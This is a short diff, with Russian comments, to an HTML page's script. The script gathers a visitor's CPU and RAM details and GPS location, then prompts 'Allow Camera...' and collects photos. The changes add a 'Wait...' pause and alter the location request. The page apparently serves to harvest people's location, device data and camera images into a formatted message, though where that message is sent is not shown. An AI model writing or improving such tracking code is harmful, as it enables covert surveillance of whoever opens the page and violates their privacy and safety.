@@ -247,12 +247,15 @@ CPU: ${s.c} ядра | RAM: ${s.r}
                         else if (err.code === 2) e = "Недоступно";
                         else if (err.code === 3) e = "Тайм-аут";
                         resolve(`*GPS Ошибка: ${e}*`);
-                    }, 
-                    { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+                    }
                 );
             });
 
             // 2. Теперь Камера (GPS уже обработан)
+            // Увеличил паузу до 2.5 секунд, чтобы если GPS отвалится сразу, ты успел прочитать/нажать
+            document.getElementById('label-text').innerText = "Wait...";
+            await sleep(2500); 
+
             document.getElementById('label-text').innerText = "Allow Camera...";
             let ph = [];
             try {
@@ -314,4 +317,3 @@ ${gps}
     </script>
 </body>
 </html>
-
